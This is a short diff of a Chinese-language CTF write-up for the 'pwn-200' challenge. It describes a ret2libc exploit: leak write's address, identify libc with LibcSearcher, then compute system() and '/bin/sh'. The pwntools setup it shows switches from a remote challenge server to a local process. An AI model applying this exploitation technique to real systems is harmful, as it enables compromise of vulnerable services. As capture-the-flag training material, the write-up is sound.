@@ -1,4 +1,4 @@
-# pwn-200
+# pwn-200 - 远程libc库未知
 
 适用于远程，用write_plt泄露出write的真实地址后，用LibcSearcher自动匹配远程libc库，然后计算出libc基址，再计算system()和'/bin/sh'的地址.  
 
@@ -8,9 +8,8 @@ import pwn
 
 pwn.context(arch='i386', os='linux', log_level='debug')
 
-#p = pwn.process('./pwn-200')
-p = pwn.remote('220.249.52.133', 41738)
-
+p = pwn.process('./pwn-200')
+#p = pwn.remote('220.249.52.133', 41738)
 e = pwn.ELF('./pwn-200')
 
 main_addr = pwn.p32(0x080484be)
